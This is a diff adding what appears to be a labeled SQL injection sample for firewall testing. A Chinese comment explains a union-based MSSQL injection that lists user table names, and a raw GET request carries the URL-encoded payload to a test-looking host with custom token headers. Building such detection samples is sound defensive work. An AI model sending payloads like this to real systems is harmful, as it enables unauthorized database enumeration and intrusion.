@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_普通注入-06506386
+# 攻击者基于union查询，将"union select name from mydb.sys.all_objects where type='U'  and is_ms_shipped=0 and name not in ('admin')"语句注入到 SQL 查询参数中，从"mydb"数据库中选择非系统表（用户表）的名称，并排除名称为"admin"的表。
+GET /?id=1%27%20union%20select%20name%20from%20mydb.sys.all_objects%20where%20type=%27U%27%20%20and%20is_ms_shipped=0%20and%20name%20not%20in%20%28%27admin%27%29&bid=hd_tag_m8mv23wk HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23wk
+RM-PRO-Token: 31ed0bb803ad06a0dcedcc423b170e45
+RM-PRO-Time: 1742808350311
+User-Agent: curl/7.83.1
+
